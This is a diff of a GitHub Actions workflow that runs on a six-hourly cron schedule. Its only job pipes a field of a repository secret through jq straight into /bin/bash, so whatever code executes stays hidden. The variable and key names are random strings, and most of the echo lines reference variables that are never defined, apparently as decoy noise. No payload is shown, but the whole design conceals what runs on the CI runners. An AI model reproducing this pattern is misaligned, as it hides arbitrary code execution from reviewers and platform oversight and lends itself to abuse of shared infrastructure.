@@ -1,28 +1,36 @@
 name: liutang19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
+    - cron: '52 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liutang19871010
         env:
-          dxtnq1: ${{ secrets.dxtnq1 }}
+          ofj8328: ${{ secrets.ofj8328 }}
         run: |
-          echo $dxtnq1 | jq -r .tqz23 | /bin/bash
-          echo $fe1 | jq -r .xju20607 | /bin/bash
-          echo $swl89 | jq -r .y7 | /bin/bash
-          echo $txs055 | jq -r .ivmk0228 | /bin/bash
-          echo $vdjp31264 | jq -r .iptzn6364 | /bin/bash
-          echo $wpqbd14 | jq -r .upfb35860 | /bin/bash
-          echo $t01 | jq -r .q163 | /bin/bash
-          echo $yetlk71399 | jq -r .cs1469 | /bin/bash
-          echo $avs2 | jq -r .c8501 | /bin/bash
-          echo $wnkd5727 | jq -r .x948 | /bin/bash
-          echo $fajkv157 | jq -r .dtlme34409 | /bin/bash
+          echo $ofj8328 | jq -r .rc5 | /bin/bash
+          echo $f2 | jq -r .dlfjy05 | /bin/bash
+          echo $v79 | jq -r .u424 | /bin/bash
+          echo $ux5629 | jq -r .spyv17 | /bin/bash
+          echo $of9990 | jq -r .x4786 | /bin/bash
+          echo $sxxl16 | jq -r .hi1420 | /bin/bash
+          echo $haxcs98784 | jq -r .fwvqi09995 | /bin/bash
+          echo $ttyc0 | jq -r .gakx85492 | /bin/bash
+          echo $qeu1 | jq -r .v65 | /bin/bash
+          echo $vu152 | jq -r .ektrf77326 | /bin/bash
+          echo $gp406 | jq -r .bvfff46218 | /bin/bash
+          echo $fpxlr43166 | jq -r .iy0 | /bin/bash
+          echo $aqu1 | jq -r .ai4870 | /bin/bash
+          echo $j020 | jq -r .rtccr3563 | /bin/bash
+          echo $h39 | jq -r .evn761 | /bin/bash
+          echo $ro69 | jq -r .qdqv1426 | /bin/bash
+          echo $pa71434 | jq -r .usvnb2676 | /bin/bash
+          echo $sc95810 | jq -r .o801 | /bin/bash
+          echo $j5 | jq -r .wvwd668 | /bin/bash
 
